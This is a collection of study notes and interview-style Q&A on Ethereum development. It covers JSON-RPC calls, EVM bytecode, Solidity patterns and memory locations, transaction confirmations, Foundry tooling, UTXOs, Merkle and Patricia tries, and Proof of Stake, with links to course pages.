<p><strong>eth_sendTransaction (transaction)</strong> - JSON-RPC API method provided by Ethereum nodes to create and broadcast transactions. It is used for <strong>modifying</strong>/writing new information to the smart contract. And you have to sign a transaction and <strong>send a gas fee</strong>.</p><p></p><p><strong>eth_call (call)</strong> - also an JSON-RPC API method. it's used for <strong>reading</strong>/fetching information from the smart contracts. For these calls you <strong>don't</strong> have to <strong>send a gas fee</strong>.</p><p></p><p>RPC is the way to communicate with the Ethereum Node. If you're using web3js or ethersjs, these are the two function that they use under the hood.</p>

<h2>What are the requirements for deploying a smart contract on the Ethereum network?</h2>
<ul><li><p><strong>A bytecode of a smart contract</strong></p></li><li><p><strong>An Ethereum address with sufficent Ether</strong></p></li><li><p><strong>A wallet to sign the transaction</strong></p></li><li><p><strong>A tool to create the transaction and signing of the transaction with the wallet</strong></p></li></ul>

<h2>What exactly is EVM bytecode?</h2>
<p>This is one of the most popular Solidity interview questions. </p><p></p><p>EVM bytecode is a low-level programming language that is compiled from a high-level programming language like Solidity. </p><p></p><p>EVM is a virtual machine that sits between the operating system and the application layer to reduce OS dependency. </p><p></p><p>Ethereum smart contracts, thanks to EVM, can be run on nearly any computer. </p><p></p><p>The EVM bytecode comprises opcodes, which are EVM elementary instructions. These opcodes define basic operations such as adding two numbers (ADD), loading data from memory (mload), and so on. </p><p></p><p>The Ethereum yellow paper defines over 100 of these opcodes. </p><p></p><p>We need higher languages like Solidity to help us reason at a higher level of abstraction because coding directly using opcodes would be incredibly tiresome.</p>

<h2>Is it feasible to send a transaction without having to charge customers for gas?</h2>
<p>You‚Äôll often find this question among the Solidity developer interview questions, and the answer is Yes. You'd have people sign a message on the front end first. The message and signature would then be routed to a centralized backend (off-chain) that would establish a transaction and include the payload (message + signature).</p><p></p><p>This means that instead of the user's wallet, the app's wallet will cover gas costs. A smart contract will validate the signature's validity and perform an activity on behalf of the user on the blockchain.</p>

<h2>100 Solidity interview questions and answers in 2024</h2>
<a href="https://www.turing.com/interview-questions/solidity" target="_blank" rel="noopener noreferrer">link</a>

<h2>Solidity Paterns</h2>
<ul><li><p><strong>Behavioral Patterns</strong></p><ul><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/guard_check.html"><strong>Guard Check</strong></a>: Ensure that the behavior of a smart contract and its input parameters are as expected.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/state_machine.html"><strong>State Machine</strong></a>: Enable a contract to go through different stages with different corresponding functionality exposed.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/oracle.html"><strong>Oracle</strong></a>: Gain access to data stored outside of the blockchain.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/randomness.html"><strong>Randomness</strong></a>: Generate a random number of a predefined interval in the deterministic environment of a blockchain.</p></li></ul></li><li><p><strong>Security Patterns</strong></p><ul><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/access_restriction.html"><strong>Access Restriction</strong></a>: Restrict the access to contract functionality according to suitable criteria.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html"><strong>Checks Effects Interactions</strong></a>: Reduce the attack surface for malicious contracts trying to hijack control flow after an external call.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/secure_ether_transfer.html"><strong>Secure Ether Transfer</strong></a>: Secure transfer of ether from a contract to another address.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/pull_over_push.html"><strong>Pull over Push</strong></a>: Shift the risk associated with transferring ether to the user.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/emergency_stop.html"><strong>Emergency Stop</strong></a>: Add an option to disable critical contract functionality in case of an emergency.</p></li></ul></li><li><p><strong>Upgradeability Patterns</strong></p><ul><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/proxy_delegate.html"><strong>Proxy Delegate</strong></a>: Introduce the possibility to upgrade smart contracts without breaking any dependencies.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/eternal_storage.html"><strong>Eternal Storage</strong></a>: Keep contract storage after a smart contract upgrade.</p></li></ul></li><li><p><strong>Economic Patterns</strong></p><ul><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/string_equality_comparison.html"><strong>String Equality Comparison</strong></a>: Check for the equality of two provided strings in a way that minimizes average gas consumption for a large number of different inputs.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/tight_variable_packing.html"><strong>Tight Variable Packing</strong></a>: Optimize gas consumption when storing or loading statically-sized variables.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://fravoll.github.io/solidity-patterns/memory_array_building.html"><strong>Memory Array Building</strong></a>: Aggregate and retrieve data from contract storage in a gas efficient way.<br></p></li></ul></li></ul>
<a href="https://fravoll.github.io/solidity-patterns/" target="_blank" rel="noopener noreferrer">link</a>

<h2>Most toxic Smart Contract Feature</h2>
<p>Self destruct(suicide) is the most toxic Smart Contract Feature. It's an OPCode at the EVM level. It destroys the Contracts code and sends all it's balance to any address you specify.</p><p></p><p>Imagine you create a contract and you don't need it anymore or it has a bug in it. What do you do? Well you can call this function and return all the contracts balance to your wallet. That's quite convenient and useful when you want to a clean up right?</p><p></p><p>It uses negative gas, because it frees up space in the blockchain.</p><p></p><p>Even if a contract is removed by self destruct, its still part of the blockchain's history.</p><p>So using self destruct is not the same as deleting data from a hard disk.</p><p></p><p>So What's the issue here?</p><p>If anybody sends Ether to a destroyed contract, that Ether is <strong>FOREVER LOST</strong>. Essentially it's like burning your ETH.</p><p>Self destruct is a powerful operation that can cause huge damage in wrong hands.</p><p></p><p></p>
<a href="https://www.youtube.com/watch?v=IMSmEAYGTp4" target="_blank" rel="noopener noreferrer">link</a>

<h2>Different types of memory locations in Solidity</h2>
<p>Solidity has different memory locations:</p><ul><li><p><strong>Storage</strong> mean the variable is <strong>saved inside of the blockchain</strong> in the contract. State variables are automatically storage variables. <strong>Pointers to deeply nested data in storage require the storage keyword</strong>.</p></li><li><p><strong>Memory</strong> variables are <strong>short-term</strong> and are not stored on the blockchain so they are not presistnet. They are used <strong>inside functions</strong> and after the function has completed they are destroyed.</p></li><li><p><strong>Stack</strong> is every<strong> simple variable</strong> defined <strong>inside a function</strong>. They are only available inside the function and its lifetime is the same as the functions. Sometimes when you define too many stack variables the solidity compiler will throw you and error. There is a <strong>limit</strong> on how many variables you can define.</p></li><li><p><strong>Calldata</strong> is only available for function that are either external or public because it <strong>references complex data inside transaction</strong>. So when you accept an array coming from a transaction(so the function is external) in you function then the memory is calldata.</p></li></ul><p></p><p>When you have defined User as a struct and you have an array of these users. Then when you define the variable of an individual user stored in users as <strong>storage</strong> and make <strong>changes</strong> up on this variable then it will actually also <strong>change</strong> the <strong>storage variable</strong> inside the array. As seen in <code>changeUserName</code> function below.</p><p>On the other hand function <code>changeUserNameLocally</code> shows if you define user with <strong>memory</strong> of an individual user <strong>stored</strong> in users array and make <strong>changes</strong> up on that variable, the array <strong>won't be affected</strong>, only the user variable inside the function and once the function finishes it gets destroyed.</p><pre><code>contract MyContract {
  struct User {
    stirng name;
  }
  User[] users;

  function changeUserName(){
    User storage user = users[0];
    user.name = 'Joseph'; // this will change the user inside the users array
  }

  function changeUserNameLocally() {
    User memory user = users[0];
    user.name = 'Joseph'; // this will only change the user name of the variable user, but not the one in users array because the variable is defined as memory
  }

  function stackVariables() {
    uint number; // this is a stack variable
  }

  function callDataVariables(uint[] calldata numbers) external { // this is example of calldata 
  }
}</code></pre>
<a href="https://www.youtube.com/watch?v=jA_ykc6woig" target="_blank" rel="noopener noreferrer">link</a>

<h2>How to Handle Transaction Confirmations in Dapps?</h2>
<p>When a user's transaction is included in a block that is added to the blockchain, this is called a block confirmation. A user's transaction must receive several block confirmations (meaning <strong>it must be included in a series of blocks</strong>) before it can be accepted by the network as valid.</p><p></p><p>Understanding transaction and confirmation is important for security in decentralized applications.</p><p></p><p><strong>The problem:</strong></p><p>- A trader with a lot of tokens wants to sell them on a decentralized exchange</p><p>- If the transaction is not confirmed properly, the trader may lose a significant amount of money if the token price drops</p><p>- Chain organization can occur when the Ethereum network has to decide which block to accept, resulting in some transactions being discarded</p><p></p><p><strong>Calculations:</strong><br>So for small transactions you need maximum of 10 confirmations and that gives you 99.99% probability that it will go through. Confirmations mean that a block has been mined on top of your block.</p><p>For larger transactions, some exchanges require 100, 200 or even 500 confirmations.</p><p>One block takes around 13seconds to be mined. So for small transactiosn that's 10confirmations * 13seconds = 130s / 60 = <strong>2minutes and 10seconds</strong>.</p><p>So large transactions, lets say 100 confirmations are needed, then that's 100confirmations * 13seconds = 1300s / 60 = <strong>21minutes and 40 seconds</strong>.</p><p>That's a lot of time to just sit at your computer, even the 2minutes are long time. Isn't there a better solution? I wonder?<br></p><p><strong>How to solve it:</strong></p><p>- Developers can display the number of confirmations dynamically to users and show a confirmation pop-up after a transaction is selected. Like listening on events emitted by using websockets.</p><p></p><p><strong>So how many confirmations are needed?</strong></p><p><strong>Coinbase</strong>, for example, requires <strong>35 confirmations for Ethereum</strong>, which typically takes around ten minutes. <strong>Binance</strong> requires <strong>12 confirmations</strong>, also processed in under ten minutes, while <strong>Kraken</strong> needs <strong>20 confirmations</strong>, which can take about five minutes.</p><p></p><p>The number of confirmations for <strong>Bitcoin</strong> and other cryptocurrencies also varies by exchange. Generally, Bitcoin transactions are considered final after <strong>at least three confirmations</strong>, which can take about 30 minutes depending on the network congestion and transaction volume.</p><p></p><p>Overall, the confirmation time for Ethereum and other cryptocurrencies<strong> is influenced by the chosen exchange</strong>, the transaction fee (gas), and the current network load. Users should select platforms with high transaction throughput for faster confirmation times.<br></p>
<a href="https://www.youtube.com/watch?v=VajJe7uaVzE" target="_blank" rel="noopener noreferrer">link</a>

<h2>Building and testing smart contracts with Foundry</h2>
<p><strong>Foundry</strong> is a <strong>fast</strong> and <strong>portable</strong> and <strong>modular</strong> toolkit for Ethereum application development.</p><p></p><ol><li><p>It allows you to <strong>write tests</strong> and scripts <strong>in Solidity</strong> instead of JS</p></li><li><p>It's <strong>fast</strong> because it's written in Rust</p></li></ol><p></p><p>Made up of 3 tools:</p><ol><li><p><strong>Forge</strong> is the Ethereum development and testing framework.</p></li><li><p><strong>Cast</strong> is a CLI that allows you to interact with EVM smart contracts, send transactions, and read data from the network.</p></li><li><p><strong>Anvil</strong> is a local Ethereum node, similar to Ganache or Hardhat node.</p></li></ol><p></p><pre><code class="language-sh">forge init</code></pre><p></p><pre><code class="language-sh">forge build</code></pre><p></p><pre><code class="language-sh">forge test</code></pre><p></p><p>There are also utilities for:</p><p><strong>truthiness</strong> - <code>assertTrue</code></p><p><strong>decimal equality</strong> - <code>assertEqDecimal</code></p><p><strong>greater than, less than</strong> - <code>assertGt</code>, <code>assertGe</code>, <code>assertLt</code>, <code>assertLe</code></p><p>You can view most of the assertions <a target="_blank" rel="noreferrer" href="https://book.getfoundry.sh/reference/ds-test.html#asserting">here</a>.</p><p></p><p>Foundry also supports <a target="_blank" rel="noreferrer" href="https://en.wikipedia.org/wiki/Fuzzing">fuzzing</a>.</p><p></p><p>Foundry also supports logging.</p><p>To log out the greeting, we can use <code>log</code>, <code>log_string</code>, or <code>log_named_string</code>.</p><p>To print the logs, we need to run the test script with the <code>-vv</code> flag:</p><p></p><pre><code>forge test -vv</code></pre><p></p><p>You can start the local EVM test network at any time:</p><p></p><pre><code>anvil</code></pre><p></p><p>This will start a local network and spin up 10 accounts and private keys and log them out to the console.</p><p></p><p>Foundry is a welcome addition to the web3 stack, bringing improved tooling and performance for smart contract testing and development.</p>
<a href="https://nader.mirror.xyz/6Mn3HjrqKLhHzu2balLPv4SqE5a-oEESl4ycpRkWFsc" target="_blank" rel="noopener noreferrer">link</a>

<h2>How Bitcoin and Ethereum transform Public Key to an Address?</h2>
<p><strong>Bitcoin</strong> and <strong>Ethereum</strong> both have a transformation process to take a <strong>public key</strong> and turn it into an <strong>address</strong>.</p><p></p><p>For Bitcoin it includes <a target="_blank" rel="noopener noreferrer nofollow" class="chakra-link css-181sfzb" href="https://en.bitcoin.it/wiki/Technical_background_of_version_1_Bitcoin_addresses">a checksum and Base58 encoding</a>. </p><p></p><p>Ethereum's address transformation is quite a bit simpler, its address is the last <strong>20 bytes</strong> of the <strong>hash</strong> of the <strong>public key</strong>.<br></p><p>The important thing to recognize here is that the address is differentiated from the public key, but you can always derive the address if you have the public key.</p>
<a href="https://university.alchemy.com/course/ethereum/sc/631631e2d13b2d24e60dcceb/stage/6316b992505aa70c2106fbc4" target="_blank" rel="noopener noreferrer">link</a>

<h2>How to create a meme token?</h2>
<a href="https://github.com/DevSwanson/how-to-create-memetoken-memecoin?tab=readme-ov-file" target="_blank" rel="noopener noreferrer">link</a>

<h2>What does EVM mean?</h2>
<p>Ethereum Virtual Machine</p><p></p><p>It's a <strong>software</strong> that sets the <strong>rules of computing</strong> the <strong>state</strong> of the Ethereum network from block to block.</p><p></p><p>The EVM is a <strong>core part</strong> of Ethereum as it:</p><ul><li><p><strong>executes smart contracts</strong>,</p></li><li><p><strong>processes transactions</strong>,</p></li><li><p>and <strong>updates</strong> account <strong>balances</strong>.</p></li></ul>

<h2>What does UTXO mean?</h2>
<p><strong>UTXO</strong> stands for "<strong>Unspent Transaction Output</strong>".<br><br>Bitcoin uses the <strong>UTXO model </strong>to store data on the blockchain.</p><p></p><p>Bitcoin network keeps track of user balances - it keeps a really big long set of UTXOs - outputs out of state-changing transactions.</p><p></p><p>So when people say: "I own 3 bitcoins", they should really be saying: "I own some UTXOs that allow me to spend 3 bitcoins."</p><p></p><p>Meanwhile Ethereum uses the <strong>Account model</strong>.</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d93935b8310004455d9f" target="_blank" rel="noopener noreferrer">link</a>

<h2>What do we need in a transaction?</h2>
<p>Three main things:</p><ol><li><p><strong>amount</strong>: the amount to send to someone</p></li><li><p><strong>payer</strong>: the person sending the transfer amount</p></li><li><p><strong>payee</strong>: the person receiving the transfer amount</p></li><li><p><strong>payer authorization</strong>: some sort of unfakeable authorization given by the initiator of the transaction</p></li></ol>
<a href="https://university.alchemy.com/course/ethereum/md/6388d93935b8310004455d9f" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is the purpose of a transaction?</h2>
<p>To <strong>change</strong> some <strong>user state</strong>!</p><p></p><p>Changing state is<strong> extremely importan</strong>t in <strong>blockchains.</strong></p><p></p><p>Bitcoin, Ethereum and regular banks <strong>rely</strong> on <strong>transaction-based </strong>models to keep track of user balances.</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d93935b8310004455d9f" target="_blank" rel="noopener noreferrer">link</a>

<h2>Important notes about UTXOs:</h2>
<ol><li><p>All UTXOs are non-fungible (fun fact: the first NFT collection ever was... Bitcoin!)</p></li><li><p>To spend a UTXO, you must refer back to that <em>specific</em> UTXO.</p></li></ol><blockquote><p>A user's UTXOs are scattered across many blocks.</p></blockquote><ol start="3"><li><p>Once a UTXO is "consumed", any leftover change from the transaction creates new UTXOs representing the change amounts</p></li><li><p>A UTXO, often referred to as a "coin", can only be spent ONCE. <strong>No double-spending!</strong></p></li><li><p>In Bitcoin, each UTXO has a script associated with it</p></li></ol>
<a href="https://university.alchemy.com/course/ethereum/md/6388d93935b8310004455d9f" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a Binary Tree?</h2>
<p>A tree is considered <strong>binary</strong> when each parent has <em>at most</em> two children.</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d966b580480004dc7d48" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a Linked List?</h2>
<p>A linked list is also a tree - just a really long one that only has one child per parent in a long continuous chain.</p><p></p><p>It keeps track of a <code>next</code> node.</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d966b580480004dc7d48" target="_blank" rel="noopener noreferrer">link</a>

<h2>Vocabulary for trees</h2>
<ul><li><p><strong>key</strong>: actual data held inside <code>node</code></p></li><li><p><strong>root</strong>: the parentest node in a tree</p></li><li><p><strong>siblings</strong>: nodes under the same parent and on the same level</p></li><li><p><strong>subtree</strong>: once you isolate a part of a broader tree, you can form a brand new tree with new relationships</p></li></ul>
<a href="https://university.alchemy.com/course/ethereum/md/6388d966b580480004dc7d48" target="_blank" rel="noopener noreferrer">link</a>

<h2>When to use Trees?</h2>
<ul><li><p>If your <strong>data</strong> can be <strong>stored hierarchically</strong>, using a tree can be a good data structure to go with.</p></li><li><p>A tree is also a very <strong>efficient</strong> data structure for the <strong>searching</strong> and <strong>sorting</strong> of <strong>data</strong></p></li></ul>
<a href="https://university.alchemy.com/course/ethereum/md/6388d966b580480004dc7d48" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a Binary Search Tree?</h2>
<ul><li><p>it is a <strong>binary tree</strong></p></li><li><p>the <strong>left subtree</strong> of a node contains only nodes with keys <strong>lesser than</strong> the node's key</p></li><li><p>the <strong>right subtree</strong> of a node contains only nodes with keys <strong>greater than</strong> the node's key</p></li><li><p>each node‚Äôs left and right subtrees must also be a <strong>binary search tree</strong></p></li></ul><p></p><p>The search time always remains O(log n)</p><p></p><p>Here is the real magic of enforced-property trees like BSTs: even though we add a whole new level of new data, the search time only increases by <em>one</em>. </p><p></p><p>In other words, as the size of the tree grows at an exponential, the search time always remains O(log n).</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d966b580480004dc7d48" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a Merkle Tree?</h2>
<p>It's a data structure that allows us to make <strong>efficient verifications</strong> that data <strong>belongs</strong> in a<strong> larger set </strong>of data.</p><p></p><p>We use letters for convenience in this illustration.</p><p></p><p>Each single letter represents a hash. The combined letters represent concatenated hashes that have been combined and hashed to form a new hash.</p><p></p><p>Over a series of a steps the eight leaf hashes <code>A</code>, <code>B</code>, <code>C</code>, <code>D</code>, <code>E</code>, <code>F</code>, <code>G</code>, and <code>H</code> are combined to create a single, unique hash that allows us to <strong>quickly check for inconsistencies</strong> WITHOUT having to look at <strong>each individual</strong> data point.</p><p></p><p>As peers in a system, I can simply ask if your root matches mine. If so, we agree. This is a nice optimization for distributed systems of any kind!<br></p><pre><code>  ABCDEFGH &lt;-- Merkle Root
    /    \
 ABCD     EFGH
 / \      / \
AB  CD   EF  GH
/ \  / \  / \ / \
A B  C D  E F G H</code></pre><p></p><p><strong>What do we need in order to prove that </strong><code>E</code> belongs in this tree?</p><p>Just <code>F</code>, <code>GH</code>, <code>ABCD</code>. We use these to calculate <code>EF</code>, <code>EFGH</code>, and <code>ABCDEFGH</code>. Then we can compare the result to our expected root <code>ABCDEFGH</code>&nbsp;.</p><p></p><p>f something went wrong along the way, we would notice it at the root. For example if we replaced E with M.</p><p></p><p>We can quickly check <code>ABCDMFGH</code> against the our expected root <code>ABCDEFGH</code> and see we did not get our expected hash. Something's wrong.</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d8d9d864890004f7e963" target="_blank" rel="noopener noreferrer">link</a>

<h2>Merkle Trees in Bitcoin</h2>
<p>The design of merkle trees makes them extremely efficient for data verification.</p><p>In Bitcoin, Merkle trees are used to <strong>store every transaction</strong> mined on the Bitcoin network in an <strong>efficient way</strong>.</p><p></p><p>All of the transactions per block are arranged into a big Merkle tree. What actually ends up getting <strong>committed</strong> into the block and immutable blockchain is that <strong>Merkle tree's root hash</strong>.</p><p></p><p>By committing the root hash of the tree, the <strong>transaction data</strong> can be <strong>stored off-chain</strong> (full nodes, for example, store these transaction records on a LevelDB integrated into all full nodes).</p><p></p><p>Thanks to Merkle trees, storage on the blockchain is <strong>efficient</strong> - you must <strong>only commit one piece of data</strong> instead of <strong>thousands</strong> of transactions per block, which would really bloat the system!</p><p></p><p>if anyone ever needs to prove that a <strong>transaction existed</strong> at one point in time in the blockchain, they just need to <strong>provide</strong> a <strong>Merkle proof</strong>.</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d9808343d500046f7478" target="_blank" rel="noopener noreferrer">link</a>

<h2>Merkle Trees Use Cases</h2>
<h2></h2><p>Merkle trees are:</p><ul><li><p>space and computationally efficient</p></li><li><p>good for scalability and decentralization</p></li><li><p>no need to pack a block full of transactions‚Ä¶ just commit a Merkle root hash to it and keep transactions in other places that can handle them</p></li></ul><p></p><p></p><p>In deeper terms, they:</p><ol><li><p>They significantly reduce the memory needed to verify that data has maintained its integrity and hasn‚Äôt been altered.</p></li><li><p>They require less data to be broadcast across the blockchain network to verify data and transactions. This improves the efficiency of a blockchain.</p></li><li><p>They allow for <a target="_blank" rel="noopener noreferrer nofollow" class="chakra-link css-181sfzb" href="https://wiki.bitcoinsv.io/index.php/Simplified_Payment_Verification">Simple Payment Verification (SPV)</a>, which helps you to verify a transaction without downloading an entire block or blockchain. This allows you to send and receive transactions using a light-client node ‚Äî more commonly known as a <em>crypto wallet</em>.</p></li></ol>
<a href="https://university.alchemy.com/course/ethereum/md/6388d9808343d500046f7478" target="_blank" rel="noopener noreferrer">link</a>

<h2>Why you want to be efficient in your use of data storage on Ethereum?</h2>
<p>Keeping data storage lean and efficient is the reason behind using structures like Merkle trees - this understanding is essential as you start building out dApps, you always want to be lean and efficient with your data storage. </p><p></p><p>Why? Because on Ethereum, the less efficient your use of data storage, the more expensive your program will be for you and your users.</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d9808343d500046f7478" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a Radix Trie?</h2>
<p>"Trie" comes from the word "retrieval"<br><br>A radix trie is a tree-like data structure that is used to retrieve a string value by traversing down a branch of nodes that store associated references (keys) that together lead to the end value that can be returned:<br></p><blockquote><p>In grouping associated keys together, our search for the end value is optimized and more efficient</p></blockquote><h2></h2>
<a href="https://university.alchemy.com/course/ethereum/md/6388d99fd864890004f7e974" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a Patricia Merkle Trie?</h2>
<p>Regular Merkle trees are not a data structure fit for editing, so edit time -- how efficient it is to change a record -- does not matter here.</p><p></p><p>The main goal behind their usage is to prove the consistency of data as the blockchain grows.</p><p></p><p>That's why Ethereum uses Merkle Patricia trie.</p><p></p><p>A <strong>Merkle Patricia trie</strong> is a data structure that stores key-value pairs, just like a <a target="_blank" rel="noopener noreferrer nofollow" class="chakra-link css-181sfzb" href="https://en.wikipedia.org/wiki/Hash_table">hash table</a>. In addition to that, it also allows us to verify data integrity and the inclusion of a key-value pair.</p><p></p><blockquote><p>PMTs groups similar-value nodes together in the tree. That way, searching for "HELP" leads you along the same path as searching for "HELLO" - the first three letters are shared entries of different words. Good for space efficiency and read/write efficiency.</p></blockquote><p></p><p>Patricia Merkle Trees are basically Merkle trees on steroids! Efficient for data verification needs, but also efficient for editing that data.</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d99fd864890004f7e974" target="_blank" rel="noopener noreferrer">link</a>

<h2>Why Does Ethereum Use a Merkle Patricia Trie?</h2>
<p>There are typically two different types of data:</p><ul><li><p><strong>Permanent</strong></p><ul><li><p>Once a transaction occurs, that record is sealed forever</p><ul><li><p>This means that once you locate a transaction in a block‚Äôs transaction trie, you can return to the same path over and over to retrieve the same result</p></li></ul></li></ul></li><li><p><strong>Ephemeral</strong></p><ul><li><p>In the case of Ethereum, account states change all the time! (ie. A user receives some ether, interacts with a contract, etc)</p></li><li><p>nonce, balance, storageRoot, codeHash</p></li></ul></li></ul><p></p><p>It makes sense that permanent data, like mined transactions, and ephemeral data, like Ethereum accounts (balance, nonce, etc), should be stored <em>separately</em>. Merkle trees, again, are perfect for permanent data. PMTs are perfect for ephemeral data, which Ethereum is in plenty supply of.</p><p></p><p>The block header ends up hashing all of the data properties of the block. It also includes:</p><ul><li><p><strong>State Root</strong>: the root hash of the state trie</p></li><li><p><strong>Transactions Root</strong>: the root hash of the block's transactions</p></li><li><p><strong>Receipts Root</strong>: the root hash of the receipts trie</p></li></ul><p></p><p>The state trie is just a mapping that uses an address as the key and the account state (nonce, balance, etc) as the value returned. Just an object containing some data! That is all the account state is... but this is too much data to store in each block, so a root hash of it commits the data per block.</p><p></p><p><strong>The transaction trie records transactions in Ethereum</strong>. Once the block is mined, the transaction trie is <em>never</em> updated. Each transaction in Ethereum records multiple pieces specific to each transaction such as <code>gasPrice</code> and <code>value</code>.</p><p></p><p><strong>The transaction receipt trie records receipts (outcomes) of transactions.</strong> Data including <code>gasUsed</code> and <code>logs</code> (events emitted are contained here!). Once the block is mined, the transaction receipt trie is never updated.</p>
<a href="https://university.alchemy.com/course/ethereum/md/6388d99fd864890004f7e974" target="_blank" rel="noopener noreferrer">link</a>

<h2>Vitalik Buterin  highlights several reasons for using Patricia Merkle Tries in Ethereum</h2>
<p>Efficient data verification (from its merkle properties)</p><ul><li><p>More complex light-client queries</p></li><li><p>Can quickly change values and only recompute a portion of the tree (prevents some DDOS attack vectors)</p></li><li><p>There is a limit to the depth of the tree, which prevents other DDOS attack vectors</p></li><li><p>The order of the updates do not matter for the root hash</p></li></ul><p></p><p>Ethereum nodes maintain four tries:</p><ul><li><p>A <strong>state trie</strong> which contains information about Ethereum accounts</p></li><li><p>A <strong>storage trie</strong> which is where we can write persistent data from smart contracts</p></li><li><p>A <strong>transactions trie</strong> which contains the transactions stored in a block</p></li><li><p>A <strong>receipts trie</strong> which contains log/event information from contracts</p></li></ul>

<h2>Properties of the Ethereum Computer</h2>
<p>Ethereum = A Computer. That's it! It's just a big ole' fancy decentralized computer! ü§Ø</p><p></p><h4>1. Ethereum = Truly Global Singleton</h4><p>Ethereum is possibly the first global singleton computer ever, that is fundamentally not localized (meaning, it's not located in any one single location). All other computers are either physical machines (laptops) or virtual machines, which reside in physical machines.</p><p>Ethereum does not reside in any single machine, no physical presence in any part of the world‚Ä¶ yet there is only one!</p><blockquote><p>Take a minute to really internalize the above statement! ü§Ø</p></blockquote><h4>2. Censorship Resistance</h4><p>No authority, government or corporation is behind the Ethereum computer. No one owns it, can shut it off or can use it as an advanced user (ie. a system administrator in a typical client-server setup).</p><h4>3. Ethereum = Ubiquitous &amp; Accessible</h4><p>Where there is Internet, there is Ethereum. There are no barriers to participation. If you can connect to WiFi, you can interact with the Ethereum computer. If you want to <em>write</em> to the Ethereum computer, you'll just need some ETH on top of an Internet connection - to pay gas! So, the Ethereum computer is ubiquitous (everywhere!).</p><p>In terms of accessibility, Ethereum's main smart contract programming language is currently Solidity - a language with strong similarities in design to JavaScript. JS is the programming language that powers the Internet. Therefore, the learning curb for new Ethereum devs is not that particularly difficult - it's very similar to the most popular programming language on the planet. This means the Ethereum computer is not hidden behind layers of complexity, it is accessible, as a start, to anyone that knows (or learns!) JavaScript.</p><h4>4. Ethereum = Natively Multi-User</h4><p>The Ethereum computer, thanks to the wide input range of the <code>keccack256</code> hash function, has a practically infinite range possible for account creation. The range is 2^160, a number so incredibly large, that our puny human brains cannot even comprehend it.</p><p>Basically, the Ethereum computer can supply as many accounts as we'll ever need - and then more. Try creating a new account now, easy as pie!</p><blockquote><p><a target="_blank" rel="noopener noreferrer nofollow" class="chakra-link css-181sfzb" href="https://www.youtube.com/watch?v=S9JGmA5_unY">Here's a cool video</a> that breaks down such large number ranges used in cryptography! üé•</p></blockquote><h4>5. Ethereum is Verifiable &amp; Auditable</h4><p>Any code deployed onto the Ethereum computer is honored now and forever. Smart contracts inherit the cryptographic properties of the Ethereum computer: immutability, censorship-resistance and verifiability. Once you deploy a smart contract, unless you explicitly code in a clause with a call to <code>selfdestruct</code>, that contract will live on the Ethereum computer FOREVER. No one can change it, not even Vitalik.</p>
<a href="https://university.alchemy.com/course/ethereum/md/614b9f3e7e426a001019bec9" target="_blank" rel="noopener noreferrer">link</a>

<h2>Ethereum vs. Bitcoin</h2>
<p>One of the key differences between Ethereum and Bitcoin is that Ethereum has a virtual machine built into it that supports <strong>Turing-Complete</strong> languages, which means developers can build arbitrary applications and programs on top of it.</p>
<a href="https://university.alchemy.com/course/ethereum/md/614b9f3e7e426a001019bec9" target="_blank" rel="noopener noreferrer">link</a>

<h2>Why Ethereum?</h2>
<p>The Ethereum platform enables developers to build powerful decentralized applications with built-in economic functions, while providing high availability, transparency, and neutrality.</p><p>The point of Ethereum isn‚Äôt to be fast or cheap, the point is to be trustworthy. Any program that runs on the Ethereum computer is guaranteed to run the same way everywhere, on every node. Data stored on the Ethereum computer is available everywhere, and it is permanent. Now that's a cool computer right there!</p>
<a href="https://university.alchemy.com/course/ethereum/md/614b9f3e7e426a001019bec9" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is Proof of Stake?</h2>
<p>Proof of Stake is a totally different mechanism that enables Ethereum to be:</p><ol><li><p>More secure üîí</p></li><li><p>Less energy intensive üåé&nbsp;</p></li><li><p>Greater scalability üìà<br></p></li></ol><p></p><p>In Proof of Stake, the energy requirement to become a validator is much lower and can be done by individuals without a high overhead energy cost. This encourages more users to become validators, decreasing the centralization risk, and thereby increasing the security of the network.</p><p></p><p>Validators are required to <strong>stake</strong> 32ETH by depositing it into a contract to have the ability to validate blocks. This staked ETH is used as collateral against bad actors in the network. If any given validator acts dishonest or malicious they put themselves at risk of losing their staked ETH.</p><p></p><p>Rather than all validators competing at the same time for the next block, the network randomly selects a validator to propose a block every 12 seconds, all the other validators verify that the proposed block is correct, and the cycle repeats.</p><p></p><p>This means that the energy requirements to mine any given block are significantly lower than that of PoW.</p>
